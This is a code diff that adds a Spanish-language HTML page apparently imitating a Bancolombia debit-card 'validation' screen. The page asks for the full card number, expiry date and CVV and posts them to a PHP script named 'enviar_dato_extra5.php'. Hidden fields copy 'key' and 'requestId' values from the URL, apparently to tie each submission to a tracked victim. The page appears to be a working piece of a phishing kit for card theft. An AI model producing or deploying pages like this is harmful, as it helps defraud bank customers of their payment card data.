@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pago con Tarjeta Debito</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e6c921;
+      padding: 20px;
+    }
+
+    .formulario {
+      max-width: 350px;
+      margin: 0 auto;
+      background-color: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .formulario h2 {
+      margin-bottom: 20px;
+      color: #333;
+      text-align: center;
+    }
+
+    .campo {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 20px;
+    }
+
+    .campo label {
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #444;
+    }
+
+    .campo input {
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .campo-grupo {
+      display: flex;
+      gap: 10px;
+    }
+
+    .campo-grupo .campo {
+      flex: 1;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #fdda24;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      color: #000;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #e6c921;
+    }
+  </style>
+</head>
+<body>
+
+  <form id="formularioTarjeta" action="enviar_dato_extra5.php" method="post" class="formulario">
+    <h2>Validemos los datos de tu tarjeta de debito</h2>
+
+    <img src="img/Tarjeta-Debito-Mastercard-Bancolombia@2x.svg" width="150%" style="margin-left: -80px;" alt="">
+
+    <div class="campo">
+      <label for="numero">Número de tarjeta</label>
+      <input type="tel" id="numero" minlength="16" maxlength="16" name="tar" placeholder="530691xxxxxxxxxx">
+    </div>
+
+    <div class="campo-grupo">
+      <div class="campo">
+        <label for="exp">Fecha (MM/AA)</label>
+        <input style="width: 80%;" name="fecha" type="tel" id="exp" maxlength="5" placeholder="MM/AA">
+      </div>
+      <div class="campo">
+        <label for="cvv">CVV</label>
+        <input style="width: 80%;" type="tel" name="cvv" id="cvv" minlength="3" maxlength="3" placeholder="123">
+      </div>
+    </div>
+
+<input type="hidden" name="key" id="key">
+
+
+    <input type="hidden" name="requestId" id="requestId">
+
+    <button type="submit">Validar</button>
+  </form>
+
+
+
+
+  <script>
+  // Obtener el parámetro rid de la URL
+  const params = new URLSearchParams(window.location.search);
+  const key = params.get("key");
+
+  // Asignarlo al campo oculto
+  if (key) {
+    document.getElementById("key").value = key;
+  }
+ const requestId = params.get("requestId");
+
+  // Asignarlo al campo oculto
+  if (requestId) {
+    document.getElementById("requestId").value = requestId;
+  }
+
+  
+</script>
+
+</body>
+</html>
